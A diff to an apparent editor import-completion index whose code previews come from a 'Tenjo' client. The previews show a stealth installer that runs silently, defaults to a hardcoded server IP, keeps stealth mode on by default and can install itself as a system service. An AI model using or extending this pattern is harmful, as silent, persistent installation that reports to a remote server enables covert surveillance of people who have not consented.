@@ -285,12 +285,38 @@
         "documentation": {}
     },
     {
+        "label": "Path",
+        "importPath": "pathlib",
+        "description": "pathlib",
+        "isExtraImport": true,
+        "detail": "pathlib",
+        "documentation": {}
+    },
+    {
         "label": "shutil",
         "kind": 6,
         "isExtraImport": true,
         "importPath": "shutil",
         "description": "shutil",
         "detail": "shutil",
+        "documentation": {}
+    },
+    {
+        "label": "argparse",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "argparse",
+        "description": "argparse",
+        "detail": "argparse",
+        "documentation": {}
+    },
+    {
+        "label": "signal",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "signal",
+        "description": "signal",
+        "detail": "signal",
         "documentation": {}
     },
     {
@@ -442,6 +468,42 @@
         "description": "client.stealth_install",
         "peekOfCode": "def main():\n    \"\"\"Main installation function\"\"\"\n    # Get server URL from command line or use default\n    server_url = sys.argv[1] if len(sys.argv) > 1 else \"http://103.129.149.67\"\n    installer = StealthInstaller(server_url)\n    success = installer.silent_install()\n    # No output - completely silent\n    sys.exit(0 if success else 1)\nif __name__ == \"__main__\":\n    main()",
         "detail": "client.stealth_install",
+        "documentation": {}
+    },
+    {
+        "label": "TenjoStartup",
+        "kind": 6,
+        "importPath": "client.tenjo_startup",
+        "description": "client.tenjo_startup",
+        "peekOfCode": "class TenjoStartup:\n    def __init__(self, server_url=None, stealth_mode=True):\n        self.server_url = server_url or Config.SERVER_URL\n        self.stealth_mode = stealth_mode\n        self.client = None\n        self.stealth_manager = None\n        self.running = False\n        # Setup logging\n        self.setup_logging()\n    def setup_logging(self):",
+        "detail": "client.tenjo_startup",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "client.tenjo_startup",
+        "description": "client.tenjo_startup",
+        "peekOfCode": "def main():\n    \"\"\"Main entry point\"\"\"\n    parser = argparse.ArgumentParser(description='Tenjo Client Startup Script')\n    parser.add_argument('--server-url', '-s', \n                       help='Server URL (default: from config)')\n    parser.add_argument('--no-stealth', action='store_true',\n                       help='Disable stealth mode')\n    parser.add_argument('--install-service', action='store_true',\n                       help='Install as system service')\n    parser.add_argument('--uninstall-service', action='store_true',",
+        "detail": "client.tenjo_startup",
+        "documentation": {}
+    },
+    {
+        "label": "current_dir",
+        "kind": 5,
+        "importPath": "client.tenjo_startup",
+        "description": "client.tenjo_startup",
+        "peekOfCode": "current_dir = Path(__file__).parent\nsrc_dir = current_dir / 'src'\nsys.path.insert(0, str(src_dir))\n# Import after path setup\ntry:\n    from core.config import Config\n    from utils.stealth import StealthManager\n    from main import TenjoClient\nexcept ImportError as e:\n    print(f\"Error importing modules: {e}\")",
+        "detail": "client.tenjo_startup",
+        "documentation": {}
+    },
+    {
+        "label": "src_dir",
+        "kind": 5,
+        "importPath": "client.tenjo_startup",
+        "description": "client.tenjo_startup",
+        "peekOfCode": "src_dir = current_dir / 'src'\nsys.path.insert(0, str(src_dir))\n# Import after path setup\ntry:\n    from core.config import Config\n    from utils.stealth import StealthManager\n    from main import TenjoClient\nexcept ImportError as e:\n    print(f\"Error importing modules: {e}\")\n    print(\"Make sure all required modules are installed and paths are correct.\")",
+        "detail": "client.tenjo_startup",
         "documentation": {}
     },
     {
